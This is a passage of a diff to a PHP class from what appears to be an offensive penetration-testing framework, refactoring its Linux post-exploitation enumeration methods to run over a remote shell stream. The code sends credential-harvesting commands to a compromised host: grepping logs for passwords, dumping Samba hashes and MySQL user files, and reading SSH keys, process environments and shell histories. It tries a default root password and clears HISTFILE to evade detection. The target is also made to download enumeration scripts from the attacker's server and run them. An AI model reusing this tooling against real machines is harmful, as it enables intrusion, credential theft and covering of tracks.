@@ -11,43 +11,43 @@ class check4linux8enum extends STREAM4COM{
      */
 
     
-    public function __construct($eth,$domain,$ip,$port,$protocol,$stream) {        
-        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream);
+    public function __construct($eth,$domain,$ip,$port,$protocol) {        
+        parent::__construct($eth,$domain,$ip,$port,$protocol);
     }
     
     
     
-    public function lan2bins(){
+    public function bins($stream){
         
         $this->titre(__FUNCTION__);
             
             $this->ssTitre("What OS is currently running?");
             $this->note("Debian");
             $data = "dpkg -l | grep '^ii' | awk '{print $2 \"=\" $3 \"=\" $5}'";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $this->note("RedHat");
             $data = "rpm -qa --last";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "yum list | grep installed";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("Solaris");
             $data = "pkginfo";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "pkg_info";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("Gentoo");
             $data = "cd /var/db/pkg/; ls -d ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("Arch Linux");
             $data = "pacman -Q";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
 
             
@@ -57,36 +57,36 @@ class check4linux8enum extends STREAM4COM{
     
     
     
-    public function lan2hw(){
+    public function hw($stream){
         $this->titre(__FUNCTION__);
            
  
             
             $data = "df -h";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("Are there any unmounted file-systems?");
             $data = "grep -v -e '^$' /etc/fstab  | grep -v '^#' | sort -u 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "cat /proc/cpuinfo";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "/usr/bin/lspci";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "/usr/bin/lsusb";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("Is there a printer?");
             $data = "lpstat -a";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "lscpu";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "lsmem";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
       
     }
@@ -100,52 +100,52 @@ class check4linux8enum extends STREAM4COM{
     
     
     
-    public function lan2lhost(){
+    public function lhost($stream){
         
         $this->titre(__FUNCTION__);
         $this->article("IP",$this->ip);
         
             
             $data = "ls -alh /var/lib/pgsql";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "ls -alh /var/lib/mysql";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "cat /var/lib/dhcp3/dhclient.leases  | grep -v '^#' | sort -u 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "pdbedit -L -w";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "pdbedit -L -v";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "grep -v -e '^$' /etc/fstab | grep -v '^#' 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "find /etc/sysconfig/ -type f -exec cat {} \;  | grep -v '^#' 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "chkconfig --list";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
          
             $this->note("umask value as in /etc/login.defs");
             $data = "grep -i \"^UMASK\" /etc/login.defs 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
              
             $this->note("current umask value with both octal and symbolic output");
             $data = "umask -S 2>/dev/null & umask 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $this->note("check if selinux is enabled");
             $data = "sestatus 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
     }
     
     
-    public function lan2infos(){
+    public function infos($stream){
         
         // find ./ -type f -name '*.C' -o -name '*.cc' | xargs -I '{}' mv '{}' '{}'.BAK
         // find ./ -type f -regex ".*\.\(C\|cpp\)$" | xargs -I '{}' mv '{}' '{}'.BAK
@@ -157,37 +157,37 @@ class check4linux8enum extends STREAM4COM{
             
             $this->note("apache details - if installed");
             $data = "apache2 -v 2>/dev/null; httpd -v 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("what account is apache running under");
             $data = "grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,\"\")}1' 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("installed apache modules");
             $data = "apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $this->note("postgres details - if installed");
             $data = "psql -V 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "psql -U postgres template0 -c 'select version()' 2>/dev/null | grep version";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "psql -U pgsql template0 -c 'select version()' 2>/dev/null | grep version";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $this->note("mysql details - if installed");
             $data = "mysql --version 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "mysqladmin -uroot -proot version 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             
@@ -198,21 +198,21 @@ class check4linux8enum extends STREAM4COM{
             
             
             $data = "/bin/pwd";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $this->note("Any plain text usernames and/or passwords?");
             $data = "grep -i -E \"(user=|passw)\" /var/log/*.log | cut -d \" \" -f7- | sort -u";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "which php";
-            $php = $this->lan2stream4result($data,$this->stream_timeout);
+            $php = $this->req_str($stream,$data,$this->stream_timeout,"");
             
             if(!empty($php)){
                 $result .= $php;
                 $data = "php -r \"phpinfo();\" ";
-                $this->lan2stream4result($data,$this->stream_timeout);
+                $this->req_str($stream,$data,$this->stream_timeout,"");
                 
                 
 
@@ -223,62 +223,62 @@ class check4linux8enum extends STREAM4COM{
             
             $this->note("Finding Important Files");
             $data = "grep -v -e '^$' /etc/apache2/sites-enabled/000-default 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ls -alhtr /media/";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ls -alhtr /tmp/";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ls -alhtr /home/";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ls -alhtr /root/";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ls /home/*/id*";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
 
             
             
             $data = "ls -alh /var/mail/";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             
             
             $data = "grep -v -e '^$' /etc/rsyslog.conf  | grep -v \"^#\" | sort -u 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "cat /var/apache2/config.inc  | grep -v \"^#\" | sort -u 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "cat /var/lib/mysql/mysql/user.MYD  | strings | grep -v \"^#\" ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "cat /root/anaconda-ks.cfg  | grep -v \"^#\" | sort -u 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ls -alhR /var/www/";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
 
     }
     
     
     
-    public function lan2tools4lynis(){
+    public function tools4lynis($stream){
         
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
@@ -287,21 +287,21 @@ class check4linux8enum extends STREAM4COM{
         // $data = "wget https://github.com/CISOfy/lynis/archive/master.zip -O  /tmp/lynis.zip && unzip /tmp/lynis.zip -d /tmp/ && /tmp/lynis-master/lynis audit system  > /tmp/lynis-master/lynis.rst && cat /tmp/lynis-master/lynis.rst && rm -vr /tmp/lynis-master";
         
         $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/lynis-master.tar.xz -O  /tmp/lynis-master.tar.xz";
-        $lines = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $lines = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         
         
         $data = "tar -xvf /tmp/lynis-master.tar.xz -C /tmp/ ";
-        $lines = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $lines = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         
         $this->pause();
         
         $data = "cd /tmp/lynis-master/; bash lynis audit system --pentest --quick --no-log ";
-        $lines = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $lines = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         
         $this->pause();
         
         $data = " rm -vr /tmp/lynis* ";
-        //$lines = trim($this->lan2stream4result($data,$this->stream_timeout));
+        //$lines = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         
         // $this->pause();
         
@@ -309,19 +309,19 @@ class check4linux8enum extends STREAM4COM{
         return $result;
     }
     
-    public function lan2tools(){
+    public function tools($stream){
         
         $result = "";
         $result .= $this->titre(__FUNCTION__);
-        $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE $this->lan2where AND ".__FUNCTION__." IS NOT NULL";
+        $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE $this->where AND ".__FUNCTION__." IS NOT NULL";
         if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","id8port = '$this->port2id'"));
         else {
             $attacker_ip = $this->ip4addr4target($this->ip);
             $this->tcp2open4server($attacker_ip, $this->port_rfi);
             
-            $result .= $this->lan2tools4lynis();$this->pause();
+            $result .= $this->tools4lynis($stream);$this->pause();
             
-            $result .= $this->lan2tools4linEnum();$this->pause();
+            $result .= $this->tools4linEnum($stream);$this->pause();
             // https://github.com/DominicBreuker/pspy
             
             
@@ -332,18 +332,18 @@ class check4linux8enum extends STREAM4COM{
     
     
     
-    public function lan2tools4linEnum(){
+    public function tools4linEnum($stream){
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
         if (!file_exists("$this->dir_tmp/LinEnum.sh")) $this->requette("wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O $this->dir_tmp/LinEnum.sh ");
         $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/LinEnum.sh -O ./LinEnum.sh";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "bash ./LinEnum.sh -t";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "rm -v ./LinEnum.sh ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         return $result;
     }
@@ -356,7 +356,7 @@ class check4linux8enum extends STREAM4COM{
     
     
     
-    public function lan2os(){
+    public function os($stream){
         $this->titre(__FUNCTION__);
 
         
@@ -364,11 +364,11 @@ class check4linux8enum extends STREAM4COM{
             
             
             $data = "grep -v -e '^$' /etc/*master | grep -v '^#' | sort -u 2>/dev/null";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
 
             $data = "find /home -type f -iname '.*history' -exec cat {} \; 2>/dev/null" ;
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             
@@ -376,113 +376,113 @@ class check4linux8enum extends STREAM4COM{
             $this->note("Shows the kernel version.
 This can be used to help determine the OS running and the last time it's been fully updated.");
             $data = "cat /proc/version";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "grep -v -e '^$' /etc/issue";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "grep -v -e '^$' /etc/issue.net";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "grep -v -e '^$' /etc/*-release /etc/*_version /etc/*-version";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "/usr/bin/lsb_release -a";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "grep -v -e '^$' /etc/release";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "grep -v -e '^$' /etc/rc.conf";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "arch";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "uname -a";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "ls /boot | grep vmlinuz-";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "hostname ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "/usr/bin/hostnamectl";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $this->note("What's the Kernel version? Is it 64-bit?");
             $data = "rpm -q kernel";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
 
             
 
     }
     
     
-    public function lan2ps(){
+    public function ps($stream){
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
         
         $this->note("Process binaries and associated permissions");
         $data = "ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
               
         $this->note("lookup process binary path and permissisons");
         $data = "ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         $this->note("running processes");
         $data = "ps aux 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->ssTitre("What applications are installed? What version are they? Are they currently running?");
         
         $this->note("Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!");
         $data = "ps aux | grep root";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "ps -ef | grep root";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "ps -eo args --user 0 --no-headers ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         
         $data = "lsof | grep -i 'root' ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "lsof -nPi";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "ps aux";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "ps -ejf";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "pstree";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "ps  xao pid,ppid,pgid,sid,comm";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "ps -o pid,command --user 0 --no-headers | sort -u | grep -v \"^\[\"  | grep  \"\.\" ";
-        $process_lists = $this->lan2stream4result($data,$this->stream_timeout);
+        $process_lists = $this->req_str($stream,$data,$this->stream_timeout,"");
         $lines = explode("\n", $process_lists);
         foreach ($lines as $line){
             if(!empty($line)){
-                $this->lan2ps2extract4file($line);
+                $this->ps2extract4file($line);
             }
             
         }
@@ -491,7 +491,7 @@ This can be used to help determine the OS running and the last time it's been fu
     }
     
     
-    public function lan2ps2extract4file($line){
+    public function ps2extract4file($line){
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
         $results = array();
@@ -509,7 +509,7 @@ This can be used to help determine the OS running and the last time it's been fu
     
     
     
-    public function lan2ps2result4extract4file($compiler,$results){
+    public function ps2result4extract4file($compiler,$results){
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
         $result .= $this->article("PID", $results['pid']);
@@ -517,27 +517,27 @@ This can be used to help determine the OS running and the last time it's been fu
         $result .= $this->article("File Exec", $results['file']);
         
         $this->pause();
-        $filename_path = $this->lan2file4locate($results['file'].".$compiler");
+        $filename_path = $this->file4locate($results['file'].".$compiler");
         $result .= $this->article("File PATH", $filename_path);
         if(!empty($filename_path)){
             
             $data = "ls -al $filename_path";
-            $permission = $this->lan2stream4result($data,$this->stream_timeout);
+            $permission = $this->req_str($stream,$data,$this->stream_timeout,"");
             $result .= $permission ;
             
             $data = "cat $filename_path";
-            $contenu = $this->lan2stream4result($data,$this->stream_timeout);
+            $contenu = $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ls  $filename_path.bak";
-            $file_exist = trim($this->lan2stream4result($data,$this->stream_timeout));
+            $file_exist = trim($this->req_str($stream,$data,$this->stream_timeout,""));
             
             if(!empty($file_exist)){
                 $this->note("Sauvegarde Exist");
             }
             else {
                 $data = "cp -v $filename_path $filename_path.bak";
-                $clone = $this->lan2stream4result($data,$this->stream_timeout);
+                $clone = $this->req_str($stream,$data,$this->stream_timeout,"");
             }
         }
         
@@ -601,12 +601,12 @@ This can be used to help determine the OS running and the last time it's been fu
         return $result;
     }
     
-    public function lan2pid(){
+    public function pid($stream){
         $result = "";
         $this->titre(__FUNCTION__);
         // https://github.com/DominicBreuker/pspy
         $data = "ps -eo pid,user  --no-headers | awk '{print $1}' | sort -u";
-        $tab_pid_str = $this->lan2stream4result($data,$this->stream_timeout);
+        $tab_pid_str = $this->req_str($stream,$data,$this->stream_timeout,"");
         $tab_pid = explode("\n", $tab_pid_str);
         foreach ($tab_pid as $pid){
             if (!empty($pid)) {
@@ -618,21 +618,21 @@ This can be used to help determine the OS running and the last time it's been fu
     }
     
     
-    public function lan2shell4tracks2histfile(){
+    public function shell4tracks2histfile($stream){
         $this->ssTitre(__FUNCTION__);
         $histfile = "";
         $data = "echo \$HISTFILE";
-        $histfile = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $histfile = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         if(!empty($histfile)){
             return $histfile ;
         }
         $data = "cat ~/.bash_history";
-        $histfile = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $histfile = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         if(!empty($histfile)){
             return $histfile ;
         }
         $data = "find /home -iname \".bash_history\" -type f -exec ls {} \; 2>/dev/null";
-        $histfile = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $histfile = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         if(!empty($histfile)){
             return $histfile ;
         }
@@ -640,22 +640,22 @@ This can be used to help determine the OS running and the last time it's been fu
     }
     
     
-    public function lan2shell4tracks(){
+    public function shell4tracks($stream){
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
         // https://www.computernetworkingnotes.com/linux-tutorials/customize-or-change-shell-command-prompt-in-linux.html
         // PS1="\! "
         // PS1="\t "
         // history -c
-        $histfile = $this->lan2users4tracks2histfile();
+        $histfile = $this->users4tracks2histfile();
         if(!empty($histfile)){
             $result .= $histfile;
             $data = "cat $histfile";
-            $history_str = trim($this->lan2stream4result($data,$this->stream_timeout));
+            $history_str = trim($this->req_str($stream,$data,$this->stream_timeout,""));
             $result .= $history_str;
             $data = "export HISTFILE=";
             $this->article($data, "This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out:");
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
         }
         
@@ -684,14 +684,14 @@ This can be used to help determine the OS running and the last time it's been fu
         
         $this->note("");
         $data = "";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         
     }
     
     
-    public function lan4pid($pid) {
+    public function lan4pid($stream,$pid) {
         /*
          /proc/[PID]/cmdline    Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.
          /proc/[PID]/environ    Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.
@@ -709,83 +709,83 @@ This can be used to help determine the OS running and the last time it's been fu
             
             
             $data = "cat /proc/$pid/comm";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "sh -c 'ps -p $pid -o ppid=' | xargs ps -o cmd= -p";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "sh -c 'ps -p $pid -o ppid=' | xargs -I'{}' readlink -f '/proc/{}/exe'";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "lsof -a +D /bin +D /usr/bin -p $pid -d txt";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "cat /proc/$pid/cmdline ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "cat /proc/$pid/cwd ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "cat /proc/$pid/status ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "cat /proc/$pid/environ ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "cat /proc/$pid/mem | strings ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "cat /proc/$pid/fd ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "readlink /proc/$pid/exe";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "ls -l /proc/$pid/exe | sed 's%.*/%%'";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data = "ps -f --pid $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "pidstat -p $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "ps -f --forest --pid $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "pstree -p $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "pcat -v $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "pmap -d $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "lsof -p $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $data =  "ls /proc/$pid ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $result .= $this->lan4pid8gdb($pid);
             
             $this->ssTitre("libraries trace");
             $data =  "ltrace -p $pid";
-            //$this->lan2stream4result($data,$this->stream_timeout);
+            //$this->req_str($stream,$data,$this->stream_timeout,"");
             $this->ssTitre("syscall trace");
             $data =  "strace -p $pid";
-            //$this->lan2stream4result($data,$this->stream_timeout);
+            //$this->req_str($stream,$data,$this->stream_timeout,"");
             $this->ssTitre("heap - malloc trace");
             $data =  "mtrace $pid";
-            //$this->lan2stream4result($data,$this->stream_timeout);
+            //$this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "dtrace -p $pid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             
@@ -797,59 +797,59 @@ This can be used to help determine the OS running and the last time it's been fu
     }
     
     
-    public function lan4pid8gdb($pid){
+    public function lan4pid8gdb($stream,$pid){
         $result = "";
         $result .= $this->titre(__FUNCTION__);
         $pid = trim($pid);
-        if($this->lan2search4app4exist("gdb")) {
+        if($this->search4app4exist("gdb")) {
             $data =  "gdb --batch -q -p $pid -ex \"info proc stat\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info proc status\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info variables\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info args\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info proc mappings\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"maintenance info sections\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info sharedlibrary\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info files\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
